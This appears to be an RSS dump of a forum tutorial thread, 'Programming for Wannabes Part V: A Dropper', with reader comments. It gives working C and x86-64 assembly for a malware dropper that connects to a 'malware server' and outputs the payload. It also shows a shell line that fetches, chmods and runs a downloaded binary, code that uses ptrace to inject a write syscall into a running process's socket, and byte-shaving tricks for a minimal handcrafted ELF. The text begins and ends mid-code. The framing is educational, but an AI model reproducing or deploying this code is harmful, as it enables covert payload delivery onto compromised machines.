      if ((ptrace (PTRACE_POKEDATA, _pid, p, *d)) &lt; 0) perror (&quot;POKE Stack:&quot;);
      p++; d++;
    }
	
  free (aux);
  return len;
}
```

The function just copies a given string into a given address. But as we have to do this in blocks of 8 bytes, I have just reallocated a new buffer adjusted to 8 bytes boundary and used it, instead of having extra checks in the loop.

The `for` loop in the code above is like a compressed form of `while` loop.

```
for (i = 0; i &lt; len1; i++) { (...) }
```

is equivalent to

```
i = 0;
while (i &lt; len1) {
  (...)
  i++;
}
```

Function `memset` and `strcpy` allow us to initialise a given memory region with a value or copy a memory buffer into another. `strcpy` work on C strings that are delimited by a tailing `\0`. In this case that is fine for us, otherwise we should determine the size ourselves and use `memcpy` instead.

# Sending the data

Now, everything is setup to send our data through the socket we had already identified. We had overwrite the current instruction to become a `syscall`. We have our buffer in the stack. So, now we just need to set our registers up and let the process continue execution.

```
     regs.rax = 1;        // Write syscall
     regs.rdi = 5;        // socket (the one we identified at /proc/PID/fd
     regs.rsi = regs.rsp; // Buf in the stack
     regs.rdx= slen;      // Len of buffer to write
      
     if ((ptrace (PTRACE_SETREGS, _pid, 0, &amp;regs)) &lt; 0)
	    perror (&quot;ptrace_set_regs:&quot;);
	
     if ((ptrace (PTRACE_SINGLESTEP, _pid, 0,0)) &lt; 0) perror (&quot;Run syscallL&quot;);
     wait (&amp;status);
	  
     if ((ptrace (PTRACE_SINGLESTEP, _pid, 0,0)) &lt; 0) perror (&quot;Run syscallL&quot;);
     wait (&amp;status);
```

So, we set our registers. See it as a bunch of `mov`s, but we can just set all of them at once using `PTRACE_SETREGS`. Then we use the `PTRACE_SINGLESTEP` to run our instruction and `wait` to get control back from the process.

Here I have to say that I haven&#39;t figured our yet why I need to call `PTRACE_SINGLESTEP` twice. If anybody know, let us all know in the comments.

# Cleaning up

Now the buffer has been sent to the remote machine. We just need to send the `echo` command shown above to _Drop the Dropper_ in the remote machine.

Finally, we just want to clean up, so our shell session keeps going normally. If we just stop here, `nc` will likely crash. The clean up code is also straightforward:

```
  if ((ptrace (PTRACE_POKETEXT, _pid, regs_cpy.rip, opcode)) &lt; 0) 
       perror (&quot;Restore opcode:&quot;);

  if ((ptrace (PTRACE_SETREGS, _pid, 0, &amp;regs_cpy)) &lt; 0) 
       perror (&quot;ptrace_set_regs:&quot;);
  
  if ((ptrace (PTRACE_DETACH, _pid, NULL, NULL)) &lt; 0) 
       perror (&quot;ptrace_deattach:&quot;);
  wait (&amp;status);
```

The first thing we do is to restore the original opcode we override with our own `syscall` opcodes. Note that we are now using the copy of the registers we made at the beginning, so everything will go to the right place despite of how much we could have messed around while tracing the process.

Then we restore the registers and everything should be fine to get back to the point it was before we attached to the process. Now we just need to `detach` from the process and it will just keep running normally.

# Conclusions

In this part we have worked on the concept we already know and applied it to the case of building a dropper. We have lightly touched the field of network programming and we ended up introducing the basics about writing debuggers.

Most of what we have seen in this part is pretty similar to stuff you may find in the real world. Take a look to [this post](https://0x00sec.org/t/iot-malware-droppers-mirai-and-hajime/1966) specially to the paper linked at the end about Hajime.

Did you made the dropper smaller?. Have you used other ideas to shrinking it?. Let us know. Any comment, question and feedback is welcomed! :)

 You can get all the code from my repo here:

https://github.com/0x00pf/0x00sec_code/tree/master/min_dropper</description>
    
    <lastBuildDate>Tue, 24 Nov 2020 22:04:27 +0000</lastBuildDate>
    <category>Programming</category>
    <atom:link href="https://d.clarkee.co.uk/t/programming-for-wannabes-part-v-a-dropper/23090.rss" rel="self" type="application/rss+xml" />
      <item>
        <title>Programming for Wannabes. Part V. A Dropper</title>
        <dc:creator><![CDATA[system]]></dc:creator>
        <description><![CDATA[
            <p>This topic was automatically closed after 121 days. New replies are no longer allowed.</p>
          <p><a href="https://d.clarkee.co.uk/t/programming-for-wannabes-part-v-a-dropper/23090/6">Read full topic</a></p>
        ]]></description>
        <link>https://d.clarkee.co.uk/t/programming-for-wannabes-part-v-a-dropper/23090/6</link>
        <pubDate>Tue, 12 Jan 2021 03:55:40 +0000</pubDate>
        <guid isPermaLink="false">d.clarkee.co.uk-post-23090-6</guid>
        <source url="https://d.clarkee.co.uk/t/programming-for-wannabes-part-v-a-dropper/23090.rss">Programming for Wannabes. Part V. A Dropper</source>
      </item>
      <item>
        <title>Programming for Wannabes. Part V. A Dropper</title>
        <dc:creator><![CDATA[0x00pf]]></dc:creator>
        <description><![CDATA[
            <p>Thanks you very much. I really appreciate these words</p>
          <p><a href="https://d.clarkee.co.uk/t/programming-for-wannabes-part-v-a-dropper/23090/5">Read full topic</a></p>
        ]]></description>
        <link>https://d.clarkee.co.uk/t/programming-for-wannabes-part-v-a-dropper/23090/5</link>
        <pubDate>Tue, 24 Nov 2020 22:04:27 +0000</pubDate>
        <guid isPermaLink="false">d.clarkee.co.uk-post-23090-5</guid>
        <source url="https://d.clarkee.co.uk/t/programming-for-wannabes-part-v-a-dropper/23090.rss">Programming for Wannabes. Part V. A Dropper</source>
      </item>
      <item>
        <title>Programming for Wannabes. Part V. A Dropper</title>
        <dc:creator><![CDATA[capricce_angel]]></dc:creator>
        <description><![CDATA[
            <p>Awesome is an insult in order to use this word to describe your fucking Amazing post!!! It’s a damn thing that according to the series “Programing for wannabes” increase it chapter, get few responses.</p>
<p>But don’t let this discourage you my good friend, rest assured that your work as superior to the academic shit and has the true hacker essence. and at least for the wannabe that write this, you will always be my greatest mentor!!</p>
<p>PD: I lost my access to my original account so I open this XD</p>
          <p><a href="https://d.clarkee.co.uk/t/programming-for-wannabes-part-v-a-dropper/23090/4">Read full topic</a></p>
        ]]></description>
        <link>https://d.clarkee.co.uk/t/programming-for-wannabes-part-v-a-dropper/23090/4</link>
        <pubDate>Tue, 24 Nov 2020 21:10:55 +0000</pubDate>
        <guid isPermaLink="false">d.clarkee.co.uk-post-23090-4</guid>
        <source url="https://d.clarkee.co.uk/t/programming-for-wannabes-part-v-a-dropper/23090.rss">Programming for Wannabes. Part V. A Dropper</source>
      </item>
      <item>
        <title>Programming for Wannabes. Part V. A Dropper</title>
        <dc:creator><![CDATA[messede]]></dc:creator>
        <description><![CDATA[
            <p>            <video title="Hatsoff Congratulations GIF - Hatsoff Congratulations GoodJob - Discover..." width="220" height="122" style="max-width:100%" poster="https://media.tenor.com/images/73cb895e78aa2ba1ec8cdd4da70efa46/tenor.gif" controls="">
              <source src="https://media.tenor.com/videos/8926b2e41e300f1e5f8dca9435016f54/mp4">
            </video>
</p>
          <p><a href="https://d.clarkee.co.uk/t/programming-for-wannabes-part-v-a-dropper/23090/2">Read full topic</a></p>
        ]]></description>
        <link>https://d.clarkee.co.uk/t/programming-for-wannabes-part-v-a-dropper/23090/2</link>
        <pubDate>Fri, 25 Sep 2020 06:32:47 +0000</pubDate>
        <guid isPermaLink="false">d.clarkee.co.uk-post-23090-2</guid>
        <source url="https://d.clarkee.co.uk/t/programming-for-wannabes-part-v-a-dropper/23090.rss">Programming for Wannabes. Part V. A Dropper</source>
      </item>
      <item>
        <title>Programming for Wannabes. Part V. A Dropper</title>
        <dc:creator><![CDATA[0x00pf]]></dc:creator>
        <description><![CDATA[
            <p>So far we have been much focused on reverse engineering, but everybody knows that in order to become a hacker you have to master much more than that. So in this installment we will be moving forward and making use of all the stuff we had learned till now in order to get started with network programming.</p>
<p>We will start with something very simple but that will allow us to use everything we had already learnt at the same time that we dive into networking. For this purpose we will be writing a dropper.</p>
<p>A dropper is a program, usually very small, so it gets more chances to get transferred to a remote machine and whose goal is to download other files, usually bigger parts of some malware too big to fit as part of an exploit.</p>
<p>This may sound cool to some of you, but we are basically going to write a program to transfer files between two machines. And we will try to make this program very, very small. Hopefully this will throw some light about that question on which language you should use to write malware…</p>
<h1>A simple dropper</h1>
<p>Let’s start writing our dropper in C. The program is going to be very simple. We will create a TCP connection to some fixed machine and write to <code>stdout</code> anything received from that connection.</p>
<p>In order to test the dropper in your machine, you will need two terminals. One will be play the role of the malware server, i.e. the machine containing a full-fledge malware we want to transfer to the compromised machine. For our purpose this will just be:</p>
<pre><code class="lang-bash">malware_server $ cat /usr/bin/xeyes | nc -l -p $((1111))
</code></pre>
<p>This line simulates a TCP server listening on port <code>0x1111</code> that will send the program <code>xeyes</code> to any one connecting to it. To test this, open another terminal and run the following command:</p>
<pre><code class="lang-bash">compromised_machine $ rm k; nc localhost $((1111)) &gt; k; chmod +x k; ./k
</code></pre>
<p>You can try this line and get those fancy eyes up following your mouse on the screen.</p>
<p>So, what we are going to write is a program to do what <code>nc</code> does in the example above. Yes, you can use <code>nc</code> or similar tools whenever possible, but we are here trying to be wannabees… and for that we need to be able to build any single tool we will every use… that’s the difference between script kids and hackers… I think <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
<h1>Minimal C Dropper</h1>
<p>So let’s take a look to a minimal dropper, and let’s use that code to introduce new C language concepts and start our journey. The code is this:</p>
<pre><code class="lang-auto">#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;

#include &lt;sys/types.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;arpa/inet.h&gt;

#define BUF_SIZE 1024

int main (void) {
  int                s, l;
  unsigned long      addr =  0x0100007f11110002; // Define IP the hacker way :)
  unsigned char      buf[BUF_SIZE];

  
  if ((s = socket (PF_INET, SOCK_STREAM, IPPROTO_TCP)) &lt; 0) return -2;
  if (connect (s, (struct sockaddr*)&amp;addr, 16) &lt; 0)         return -3;
  
  while (1) {
    if ((l = read (s, buf, BUF_SIZE) ) &lt;= 0) break;
    write (1, buf, l);
    if (l &lt; BUF_SIZE) break;
  }
  close (s);
  
  return 0;
  
}
</code></pre>
<p>Not bad. You already know everything about the header files. the <code>main</code> function and how to declare basic integer variables of different sizes, so I will not insist on this anymore. The rest of the code only contains stuff you already know, except for the <code>while</code> loop. But we will get to it eventually.</p>
<p>So the first thing we find is a call to a function named <code>socket</code>. This is actually a system call and in that sense it is not different of the <code>_exit</code> or <code>write</code> system call we were using in the previous instalments. This just do something different.</p>
<p>The <code>socket</code> system call allows us to create a socket. In the same way than a file allows us to use the hard drive (and I know we haven’t talked about this yet), a socket is the way the operating system give to us in order to use network interface.</p>
<p>The socket can be of different types. Just like the files that can be text or binary files, sockets also have different types. For now, and in order to keep this simple, we will just care about internet sockets or, being more pro TCP/IP. The first and third parameter we pass to <code>socket</code> defines that. The second parameter indicates the type of connection we want. It can be a <code>STREAM</code> connection like in this code, or a <code>DGRAM</code> <em>connection</em> (actually this is used for connection-less communications). Without going into protocol details, a <code>SOCK_STREAM</code> allows us to talk <code>TCP</code>, while a SOC_DGRAM` allows us to speak ‘UDP’.</p>
<p>Therefore, the first code line in the program creates a path to the network hardware and also tell the operating system that we want to talk to a remote machine over the Internet and using TCP.</p>
<p><em>There are other types of Protocol Families and socket types. But for the time being, just pay attention to the second parameter and that will be enough to write a whole bunch of tools</em></p>
<h1>Connecting</h1>
<p>You may had noted that the type of our socket is `STREAM, so our communication will flow like a stream, but, before we can do that, we need to set where to connect this stream. Using technical jargon, TCP is an connection-oriented protocol, meaning than, before any data can be exchanged a connection needs to be established. Once established we can just write and read data from the socket and that data will go to the right machine automatically.</p>
<p>This is different to the <code>DGRAM</code> type where, there is no connection, and for each piece of data we want to send (this is called technically a datagram) we always need to indicate the destination.</p>
<p>In other words. TCP is like making a phone call and UDP is like sending a letter.</p>
<p>So, we need to make the call, and this is done with the <code>connect</code> system call. Yes. This is also a system call so we are still in our comfort zone.</p>
<p>As TCP is a so-called transport protocol it defines the network locations as network addresses and ports. In general a network address identifies a machine and a port a service within that machine. So, we need to specify an IP address and a port. In our case we will be using local host (<code>127.0.0.1</code>) and port <code>0x1111</code>… the values we used at the very beginning of the text with our <code>nc</code> example.</p>
<p>In order to specify this, we would usually make use of a C structure, but we haven’t talked about structures yet… Well we can briefly talk about them right now. A structure is a compound data type that allows us to pack together multiple simple datatypes. In general, everything we declare in a structure is stored in memory in sequence, that means that we can always access that memory using different ways.</p>
<p>In our example, we are not using the structure, but if we did, it will look like this:</p>
<pre><code class="lang-auto">struct ip_addr {
	unsigned short family;
	unsigned short port;
	unsigned char ip[4];
}
</code></pre>
<p>When using the structure we can access the different fields using the identifier indicated inside the <code>struct</code> declaration. In this case, the whole structure is 8 bytes long so it fits in a <code>long</code>. And that is what we had done in our program.</p>
<pre><code> 0x0100007f11110002 -&gt; 01    --&gt; 01
                       00    --&gt; 00
    				   00    --&gt; 00
	    			   7f    --&gt; 127
		    		   1111  --&gt; Port
			    	   0002  --&gt; Address Family
</code></pre>
<p>So both things are actually the same thing. However, note that for normal programs (those that are not that cool as this one we are writing right now), you shouldn’t do this. Structures are there for good reasons, usually to ensure portability and make your program work with other protocol families, and addresses formats.</p>
<p>Anyway… that long number is all the information we need to connect to our malware server.</p>
<p>The last parameter to <code>connect</code> is the length of the structure passed as second parameter. Yes, it is 16 and not 8. The original structure, named <code>struct sockaddr</code> has a 8 bytes padding field. The size is required in order to support other protocols, where the machines or services are addressed in a different way and may need more or less space to get stored. Think for instance on Bluetooth where the devices are addressed using is BT address (kind of a MAC address).</p>
<p>So, the <code>connect</code> system call does all the TCP magic (send those <code>SYNC</code> and <code>SYNC/ACK</code> packets you may have heard about) and connects our socket (the one we created using <code>socket</code>) with the remote machine we specified in the address. At this point, anything we write in each of the ends of the connection will just get to the other side.</p>
<h1>Save the data</h1>
<p>Now we just need to read what the server is sending and drop it somewhere. Instead of opening a file and save the data directly there we had opted to write to <code>stdout</code> and let the shell redirection operations do the magic. Exactly as shown at the beginning with <code>nc</code>.</p>
<p>The code that does this is repeated here for the readers convenience:</p>
<pre><code class="lang-auto">  while (1) {
    if ((l = read (s, buf, BUF_SIZE) ) &lt;= 0) break;
    write (1, buf, l);
    if (l &lt; BUF_SIZE) break;
  }

</code></pre>
<p>This is a <code>while</code> loop. Basically it repeats whatever is after the <code>while (cond)</code> while the condition is true. In the example above we have set what is known as an infinite loop. As the condition is always true, the block affected by the <code>while</code> will repeat forever… Well actually until we leave it with the <code>break</code> keyword.</p>
<p>With this information, and making use of our knowledge about the <code>write</code> system call from previous instalments, we can easily infer that the <code>read</code> system call will read data from the indicated file descriptor (in this case it is a socket so data will be read from the network) and stores it in the indicated buffer. It will try to read as many data as the third parameter specify. As all other system calls, it will return <code>-1</code> in case of error. Otherwise <code>read</code> returns the number of bytes actually read. So we will be reading data from the network in blocks of <code>BUF_SIZE</code> bytes or less until there is nothing left (<code>read</code> will return 0 in that case) or an error occurs.</p>
<p>Then, the data we have just read we will write to <code>stdout</code> (remember file descriptor 1). The loop will finish whenever we read a block from the network with a size less than the designated buffer size.</p>
<p>Now we can compile our C program and test it using the setup we described earlier in this text.</p>
<p>In one console let’s launch the server:</p>
<pre><code>malware_server $ cat /usr/bin/xeyes | nc -l -p $((0x1111))
</code></pre>
<p>In other console, let’s compile and launch our dropper. I have named it <code>nwget_basic.c</code></p>
<pre><code>compromised_machine $ make nwget_basic
compromised_machine $ rm k; ./nwget_basic &gt; k; chmod +x k; ./k
</code></pre>
<p>If everything goes well, you should see those eyes staring at your mouse pointer</p>
<h1>Shrinking the dropper</h1>
<p>Sometimes getting a file into a machine is tricky. This may happen even with non security related scenarios. I have been in those cases were I need to transfer a file into a machine that does not have any tool to transfer files… Once I had <code>ssh</code> access to it but no <code>scp</code>. In general, if you can get to a shell in the machine there should be some way to get your files also there, but that is not always easy.</p>
<p>In other occasions, you just have a exploit that allows you to run a very small code, or transfer a few bytes. Anyway, in general, the smaller your dropper the better so we are going to shrink it as much as we could. And we already know how to do this, so I will just go quick with this. We will just substitute the system calls for assembly versions and get rid of the libc.</p>
<p>You can find the code in my github and try to recompile it yourself… or even better, you can try to write it based on what we discussed on Part II. Using this technique I manage to get my dropper down to 1.8Kb static binary (that means that I do not depend on any specific library whatsoever).</p>
<p>But we can do way better re-writing it in asm.</p>
<h1>pwget (picoWget)</h1>
<p>No, the name is not because of me. It is because the previous one was <code>nwget</code> or nanoWget, so we are going smaller this time. <code>pwget</code> is the direct asm translation of <code>nwget</code> and this is how it looks like:</p>
<pre><code class="lang-auto">section	.text
global _start

_start:
	push rbp
	mov  rbp, rsp
	sub  rsp, 1024 + 8 + 8	; Read buffer + Socket + size 
	
	;; Variables
	;; [rbp + 0x00] -&gt; s (socket)
	;; [rbp + 0x08] -&gt; len (int)
	;; [rbp + 0x10] -&gt; buf (unsigned char)
	;; Create socket
	;; s = socket (PF_INET=2, SOCK_STREAM=1, IPPROTO_TCP=6);
	mov  rdi, 2		; PF_INET 2
	mov  rsi, 1		; SOCK_STREAM
	mov  rdx, 6     ; IPPROTO_TCP
	mov  r8, 10 
	call _socket
	mov  [rbp + 0x00], rax	; Store socket in stack
	cmp  rax, 0
	jle  error

	;; connect (s [rbp+0], addr, 16)
	mov  rdi, rax
	lea  rsi, [rel addr]
	mov  rdx, 16
	mov  r8, 20
	call _connect
	test eax, eax
	jl error

l0:	; Read loop
	;; Read data from socket
	;; _read (s = [rbp + 0], [rbp + 0x10], 1024);
	mov rdi, [rbp + 0]
	lea rsi, [rbp+0x10]
	mov rdx, 1024
	call _read
	mov [rbp + 0x08], rax	; Store number of bytes read
	cmp rax, 0
	jle done

	;; Write to stdout
	;; _write (1, [rbp+0x10], [rbp+0x08])
	mov rdi, 1
	mov rdx, rax
	call _write
	cmp rax, 1024
	jl done
	jmp l0
done:
	;;  _close (s)
	mov rdi, [rbp + 0x00]	;
	call _close
	
	mov rdi, 0		; Success
	call _exit

error:
	mov rdi, 2
	lea rsi, [rel msg]
	mov rdx, 7
	call _write
	
	mov rdi, r9
	add rdi, r8
	call _exit
	
	;; Syscalls
_read:
	mov rax, 0
	syscall
	ret
	
_write:
	mov rax, 1
	syscall
	ret
	
_socket:
	mov rax, 41
	syscall
	ret
	
_connect:
	mov rax, 42
	syscall
	ret
	
_close:	mov rax, 3
	syscall
	ret
	
_exit:	mov rax, 60
	syscall
	ret
	
addr dq 0x0100007f11110002
msg  db "ERROR", 10,0

</code></pre>
<p>Despite the <code>jX</code> instruction everything should look very familiar and easy to understand to you. As I said this is the literal translation of the C program we had just discussed. The <code>jX</code> instruction performs jump based on the flag values. Flags get updated by the ALU whenever any logic or arithmetic operation is performer. The flags usually stored in a special register and each flag is a bit of that register. This way when using for instance the instruction <code>cmp</code> that allows us to compare two values, the <code>zero</code> flag will get activated when both values are equal and the <code>sign</code> flag will be activated depending on the result of the substraction of both values.</p>
<p>This way, after running a <code>cmp</code> instruction we can jump if the result of the comparison is <code>less than</code> with a <code>jl</code> or <code>less than or equal</code> with a <code>jle</code>… It is just that simple. Just look for the conditional jump instructions list for your processor and take a look to the available mnemonics.</p>
<p>This asm, once compiled and <code>stripped</code> goes down to 584 bytes. That is quite small.</p>
<h1>Getting rid of everything else</h1>
<p>Obviously our code is less than 500 bytes, so the file has still some information there that shouldn’t be strictly necessary. If we run it through <code>readelf</code> we will see still some remaining information:</p>
<pre><code class="lang-auto">$ readelf -a pwget
$ readelf -a pget
ELF Header:
  Magic:   7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00
  Class:                             ELF64
  Data:                              2's complement, little endian
  Version:                           1 (current)
  OS/ABI:                            UNIX - System V
  ABI Version:                       0
  Type:                              EXEC (Executable file)
  Machine:                           Advanced Micro Devices X86-64
  Version:                           0x1
  Entry point address:               0x400080
  Start of program headers:          64 (bytes into file)
  Start of section headers:          392 (bytes into file)
  Flags:                             0x0
  Size of this header:               64 (bytes)
  Size of program headers:           56 (bytes)
  Number of program headers:         1
  Size of section headers:           64 (bytes)
  Number of section headers:         3
  Section header string table index: 2

Section Headers:
  [Nr] Name              Type             Address           Offset
       Size              EntSize          Flags  Link  Info  Align
  [ 0]                   NULL             0000000000000000  00000000
       0000000000000000  0000000000000000           0     0     0
  [ 1] .text             PROGBITS         0000000000400080  00000080
       00000000000000f6  0000000000000000  AX       0     0     16
  [ 2] .shstrtab         STRTAB           0000000000000000  00000176
       0000000000000011  0000000000000000           0     0     1
Key to Flags:
  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),
  L (link order), O (extra OS processing required), G (group), T (TLS),
  C (compressed), x (unknown), o (OS specific), E (exclude),
  l (large), p (processor specific)

There are no section groups in this file.

Program Headers:
  Type           Offset             VirtAddr           PhysAddr
                 FileSiz            MemSiz              Flags  Align
  LOAD           0x0000000000000000 0x0000000000400000 0x0000000000400000
                 0x0000000000000176 0x0000000000000176  R E    0x200000

 Section to Segment mapping:
  Segment Sections...
   00     .text

There is no dynamic section in this file.

There are no relocations in this file.

The decoding of unwind sections for machine type Advanced Micro Devices X86-64 is not currently supported.

No version information found in this file.

</code></pre>
<p>We can do better, completely crafting our ELF file. And this will bring us to <code>fwget1</code></p>
<h1>fwget (FemtoWget)</h1>
<p>This has already been mentioned in the forum. You can refer to <a href="https://0x00sec.org/t/the-price-of-scripting-dietlibc-vs-asm/791/7">this</a> to see what we are talking about and based on that, we will get something like this:</p>
<pre><code class="lang-auto">BITS 64
	        org 0x400000
  ehdr:                                                 ; Elf32_Ehdr
                db      0x7F, "ELF", 2, 1, 1, 0         ;   e_ident
        times 8 db      0
                dw      2                               ;   e_type
                dw      0x3e                            ;   e_machine
                dd      1                               ;   e_version
                dq      _start                          ;   e_entry
                dq      phdr - $$                       ;   e_phoff
                dq      0                               ;   e_shoff
                dd      0                               ;   e_flags
                dw      ehdrsize                        ;   e_ehsize
                dw      phdrsize                        ;   e_phentsize
                dw      1                               ;   e_phnum
                dw      0                               ;   e_shentsize
                dw      0                               ;   e_shnum
                dw      0                               ;   e_shstrndx
  
  ehdrsize      equ     $ - ehdr
  
  phdr:                                                 ; Elf32_Phdr
                dd      1                               ;   p_type
                dd      5                               ;   p_offset
	        dq      0
                dq      $$                              ;   p_vaddr
                dq      $$                              ;   p_paddr
                dq      filesize                        ;   p_filesz
                dq      filesize                        ;   p_memsz
                dq      0x1000                          ;   p_align
  
  phdrsize      equ     $ - phdr


	;;  Compile
	;; nasm -f bin -o fwget fwget.asm; chmod +x fwget

	;;  https://0x00sec.org/t/the-price-of-scripting-dietlibc-vs-asm/791/7
_start:
	push rbp
	mov  rbp, rsp
	sub  rsp, 1024 + 8 + 8	; Read buffer + Socket + size 
	
	;; Variables
	;; [rbp + 0x00] -&gt; s (socket)
	;; [rbp + 0x08] -&gt; len (int)
	;; [rbp + 0x10] -&gt; buf (unsigned char)
	;; Create socket
	;; Find contants with: grep -R CONSTANT /usr/include
	;; s = socket (PF_INET=2, SOCK_STREAM=1, IPPROTO_TCP=6);
	mov rdi, 2		; PF_INET 2
	mov rsi, 1		; SOCK_STREAM
	mov rdx, 6              ; IPPROTO_TCP
	call _socket
	
	mov [rbp + 0x00], rax
	cmp rax, 0
	jle error
	

	;; connect (s [rbp+0], addr, 16)
	mov rdi, rax
	;; 	mov rsi, 0x8c0aa8c011110002
	;; 	mov rsi, 0x0100007f11110002
	lea rsi, [rel addr]
	mov rdx, 16
	call _connect
	test eax, eax
	jl error

l0:				; Read loop
	;; Read data from socket
	;; _read (s = [rbp + 0], [rbp + 0x10], 1024);
	mov rdi, [rbp + 0]
	lea rsi, [rbp+0x10]
	mov rdx, 1024
	call _read
	mov [rbp + 0x08], rax	; Store number of bytes read
	cmp rax, 0
	jle done

	;; Write to stdout
	;; _write (1, [rbp+0x10], [rbp+0x08])
	mov rdi, 1
	mov rdx, rax
	call _write
	cmp rax, 1024
	jl done
	jmp l0
done:
	;;  _close (s)
	mov rdi, [rbp + 0x00]	;
	call _close
	
	mov rdi, 0		; Success
	call _exit

error:
	;; mov rdi, 2
	;; lea rsi, [rel msg]
	;; mov rdx, 7
	;; call _write
	
	mov rdi, -1
	call _exit
	
	;; Syscalls
_read:
	mov rax, 0
	jmp _do_syscall
	
_write:
	mov rax, 1
	jmp _do_syscall
	
_socket:
	mov rax, 41
	jmp _do_syscall
	
_connect:
	mov rax, 42
	jmp _do_syscall
	
_close:
	mov rax, 3
	jmp _do_syscall
	
_exit:
	mov rax, 60
	jmp _do_syscall

_do_syscall:
	syscall
	ret
	
addr dq 0x0100007f11110002
msg  db "ERROR", 10,0
filesize equ $ - $$

</code></pre>
<p>The code is identical to <code>pwget</code> but we have added the ELF metadata manually and also removed the <code>.data</code> section and added the data we need directly on the <code>.text</code> segment. When compiled the program goes down to 327 bytes. What is very good… but we can do better</p>
<h1>Iteration 2</h1>
<p>For starters let’s remove the error checking for the <code>socket</code> system call. Sure it may fail, but that is very unlikely so that is a reasonable risk. We will also store the socket in a register instead of in the stack. We have plenty of registers that we are not using, so let’s put them to work. We will use <code>r8</code> for this purpose and, therefore all references to <code>[rbp + 0x00]</code> will be gone.</p>
<p>We will also use the 32bits version of some registers in some operations. Opcodes involving 32bits registers are shorter. For instance:</p>
<pre><code>cmp rax, 0  -&gt; 48 83 f8 00
cmp eax, 0  -&gt; 83 f8 00
</code></pre>
<p>And also combine this with classical optimisations like using <code>xor</code> to set register to zero instead of <code>mov</code></p>
<pre><code>mov    rdi,0x0   --&gt; 48 c7 c7 00 00 00 00
     ||
	 \/
xor    rdi,rdi   --&gt; 48 31 ff
     ||
	 \/
xor    edi,edi   --&gt; 31 ff
</code></pre>
<p>Using this tricks we made the binary go down to 304 bytes… but we can do better</p>
<h1>Iteration 3</h1>
<p>For iteration 3 we are going to remove unneeded code. Actually it is not unneeded and in the general case is code that has to be there. For this specific case were our objective is to make the program as small as we can, we can overlook this.</p>
<p>We are removing in this iteration:</p>
<ul>
<li>Error code check for the <code>connect</code> system call… Basically in this case it doesn’t matter if the program fails in an ordered way or it just doesn’t work. The overall result is the same</li>
<li>
<code>close</code> syscall in the socket. All file descriptors are closed automatically by the OS when the process ends, so we can also save that one.</li>
</ul>
<p>Regarding the code, we optimised the way <code>rax</code> is set for the different syscalls.</p>
<pre><code> mov rax, 41  -&gt; 48 c7 c0 29 00 00 00
    ||
	\/
 xor eax,eax  -&gt; 31 c0
 add eax,41   -&gt; 83 c0 29
</code></pre>
<p>With this changes we have gone down to 273 bytes… But we can do better</p>
<h1>Iteration 4</h1>
<p>In the iteration 4 we go even more aggressive. Let’s take a look to the changes</p>
<p>First, we reuse the 8 bytes reserved in the ELF header to add the initial code instructions. Something like this:</p>
<pre><code class="lang-auto">BITS 64
                  org 0x400000
    ehdr:                                                 ; Elf32_Ehdr
                  db      0x7F, "ELF", 2, 1, 1, 0         ;   e_ident
  _start: 
                  push rbp                ; 55
                  mov  rbp, rsp           ; 48 89 e5
                  xor esi,esi
                  jmp _start1             ; eb XX

                  dw      2                               ;   e_type
                  dw      0x3e                            ;   e_machin
                  dq      _start                          ;   e_entry

</code></pre>
<p>As you can see, we can actually use only 6 bytes in the header as the last 2 are needed to jump into the rest of the code</p>
<p>We also removed the exit code… as we do not really care in this case and changed some instructions to use 32bits registers, saving a few bytes.</p>
<p>With this changes we go down to 263 bytes. As you can imagine from this point on, we are just saving a few bytes in each iteration, but let’s see how far can we get.</p>
<h1>Iteration 5</h1>
<p>If you have been following this series you should be familiar with the concept of stack frame. You may remember that we mentioned how useful it is, but that it is not always needed…Well, this is one of those cases.</p>
<p>So, in this iteration we remove the stack frame of our program. Other than that, we just applied some minor tweaks here and there. This is how the final version looks like</p>
<pre><code class="lang-auto">BITS 64
;;; ELF header.... we make use of the 8 bytes available in the header
	org 0x400000
BUF_SIZE:	equ 1024
  ehdr:                                                 ; Elf64_Ehdr
                db      0x7F, "ELF", 2, 1, 1, 0         ;   e_ident
_start:
  	            xor edi,edi		; 31 ff  - Sets EDI to 0
	            inc edi         ; ff c7  - Sets EDI to 1
	            push rdi		; 57
	            pop  rsi		; 5e     - Sets RSO to 1
	            jmp _start1		; eb XX 


                dw      2                               ;   e_type
                dw      0x3e                            ;   e_machine
                dd      1                               ;   e_version
                dq      _start                          ;   e_entry
                dq      phdr - $$                       ;   e_phoff
                dq      0                               ;   e_shoff
                dd      0                               ;   e_flags
                dw      ehdrsize                        ;   e_ehsize
                dw      phdrsize                        ;   e_phentsize
                dw      1                               ;   e_phnum
                dw      0                               ;   e_shentsize
                dw      0                               ;   e_shnum
                dw      0                               ;   e_shstrndx
  
  ehdrsize      equ     $ - ehdr
  
  phdr:                                                 ; Elf32_Phdr
                dd      1                               ;   p_type
                dd      5                               ;   p_offset
	        dq      0
                dq      $$                              ;   p_vaddr
                dq      $$                              ;   p_paddr
                dq      filesize                        ;   p_filesz
                dq      filesize                        ;   p_memsz
                dq      0x1000                          ;   p_align
  
  phdrsize      equ     $ - phdr

	;;  Compile
	;; nasm -f bin -o fwget fwget.asm; chmod +x fwget

_start1:
	inc edi                 ; Set EDI to 2
	mov edx, 6              ; IPPROTO_TCP
	
	;; socket (AF_INET=2, SOCK_STREAM = 1, IPPROTO_TCP=6)
	call _socket
	mov ebx, eax		; Store socket on ebx
	;;  It is unlikely that the socket syscall will fail. No check for errors

	;; connect (s [rbp+0], addr, 16)
	mov edi, eax		; Saves 1 byte
	lea rsi, [rel addr]
	add edx,10
	
	call _connect
	;;	Just skip error check... if it fails is not gonna work anyway
	
	lea rsi, [rsp]	 ; Just use the stack as buffer.... we should decrement it
l0:				; Read loop
	;; Read data from socket
	;; _read (s = rbx, buf= [rsp], 1024);

	mov edi, ebx
	mov edx, BUF_SIZE
	call _read
	cmp eax, 0
	jle done

	;; Write to stdout
	;; _write (1, [rsp], rax)
	xor edi,edi
	inc edi			; rdi = 1
	mov edx, eax		; get len from _read
	call _write
	cmp eax, BUF_SIZE
	jl done
	jmp l0
done:
	;;  _close (s)
	;;	File descriptors get closed automatically when the process dies

	;; We do not care about exit code
	call _exit		
	
	;; Syscalls
_read:
	xor eax,eax
	jmp _do_syscall
	
_write:
	xor eax,eax
	inc eax

	jmp _do_syscall
	
_socket:
	;; mov rax, 41
	xor eax,eax
